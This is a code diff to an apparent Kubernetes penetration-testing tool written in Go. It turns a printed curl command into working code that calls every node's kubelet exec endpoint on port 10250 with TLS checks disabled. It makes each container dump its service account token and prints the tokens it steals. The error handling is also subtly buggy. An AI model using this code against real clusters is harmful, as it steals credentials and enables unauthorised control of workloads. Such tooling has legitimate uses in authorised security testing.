@@ -24,9 +24,11 @@ import (
 	"log"       // Logging utils
 	"math/rand" // Random module for creating random string building
 	"os"        // Environment variables ...
+	"strconv"
 
 	// HTTP client/server
 	"net/http"
+	"net/url"
 	"os/exec"
 	"regexp"
 	"strings"
@@ -902,8 +904,8 @@ func GetNodesInfo(connectionString ServerInfo) {
 //adam here
 func ExecuteCodeOnKubelet(connectionString ServerInfo) {
 	fmt.Println("+ Getting IP addess for the nodes in the cluster")
-	//nodeDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
-	//println(nodeDetailOut)
+	// nodeDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
+	// println(nodeDetailOut)
 	var nodeDetailOut2 []byte
 	nodeDetailOut2 = []byte(`{
 		"apiVersion": "v1",
@@ -1548,7 +1550,7 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo) {
 		for _, item := range getnodeDetail.Items {
 
 			for _, addr := range item.Status.Addresses {
-				fmt.Println(" found IP for node " + item.Metadata.Name + " - " + addr.Address)
+				fmt.Println("[+] Found IP for node " + item.Metadata.Name + " - " + addr.Address)
 				if addr.Type == "Hostname" {
 				} else {
 					fmt.Println("[+] Kubelet Pod Listing URL: " + item.Metadata.Name + " - http://" + addr.Address + ":10255/pods")
@@ -1582,14 +1584,46 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo) {
 									PodNamespace:  podNamespace,
 									ContainerName: containerName,
 								})
-								// Work is here.
-								cmdline := "curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /run/secrets/kubernetes.io/serviceaccount/token\""
-								println(cmdline)
+								// Let's set up to do the exec via the Kubelet
+								tr := &http.Transport{
+									TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+								}
+								ssl_client := &http.Client{Transport: tr}
+
+								// curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /run/secrets/kubernetes.io/serviceaccount/token\""
+
+								data := url.Values{}
+								data.Set("cmd", "cat /run/secrets/kubernetes.io/serviceaccount/token")
+								// data.Set("cmd", "hostname")
+
+								url_exec_pod := "https://" + addr.Address + ":10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/"
+
+								// req_exec_pod, err := http.PostForm(url_exec_pod, form_data)
+								println("===============================================================================================")
+								println("Asking Kubelet to dump service account token via URL:", url_exec_pod)
+								println("")
+								req_exec_pod, err := http.NewRequest("POST", url_exec_pod, strings.NewReader(data.Encode()))
+								req_exec_pod.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+								req_exec_pod.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))
+								resp_exec_pod, err := ssl_client.Do(req_exec_pod)
+								if err != nil {
+									fmt.Printf("Error - could not perform request --%s--\n", url_exec_pod)
+									resp_exec_pod.Body.Close()
+									continue
+								}
+								if resp_exec_pod.Status != "200 OK" {
+									fmt.Printf("Error - response code: %s\n", resp_exec_pod.Status)
+									continue
+								}
+								defer resp_exec_pod.Body.Close()
+								body_exec_command, err := ioutil.ReadAll(resp_exec_pod.Body)
+								token := string(body_exec_command)
+								println("[+] Got service account token:", token)
+								println("")
+
 							}
 						}
 					}
-
-					// Faith Add JsonParser Struct for "line" parameter ***
 				}
 			}
 		}
